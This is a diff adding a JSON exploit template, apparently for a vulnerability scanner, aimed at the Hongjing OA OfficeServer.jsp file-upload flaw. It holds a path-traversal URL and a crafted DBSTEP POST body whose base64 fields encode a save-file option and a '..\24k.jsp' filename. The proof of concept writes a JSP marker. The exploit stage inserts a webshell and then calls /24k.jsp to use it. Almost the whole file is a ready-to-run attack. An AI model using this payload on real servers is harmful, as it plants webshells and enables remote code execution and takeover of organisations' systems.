@@ -1,0 +1,36 @@
+{
+  "name":"宏景OA_OfficeServer文件上传",
+  "tag":"hongjing",
+  "type":"upload",
+  "poc": {
+    "pocGet": "/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp",
+    "pocPost": "DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nFILETYPE=Li5cMjRrLmpzcA==\r\nRECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n\r\n<% out.println(\"11nxx\");%>",
+    "header": {
+      "Cookie": "JSESSIONID=C92F3ED039AAF958516349D0ADEE426E",
+      "content-type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Linux;"
+    },
+    "Pattern": "()"
+  },
+  "exp": {
+    "step1": {
+      "expGet": "/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp",
+      "expPost": "DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nFILETYPE=Li5cMjRrLmpzcA==\r\nRECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n\r\n{webshell}",
+      "header": {
+        "Cookie": "JSESSIONID=C92F3ED039AAF958516349D0ADEE426E",
+        "content-type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Linux;"
+      },
+      "Pattern": "(DB)"
+    },
+    "step2": {
+      "expGet": "/24k.jsp",
+      "header": {
+        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
+        "User-Agent": "Mozilla/5.0 (Linux;"
+      },
+      "Pattern": "()"
+    }
+  }
+}
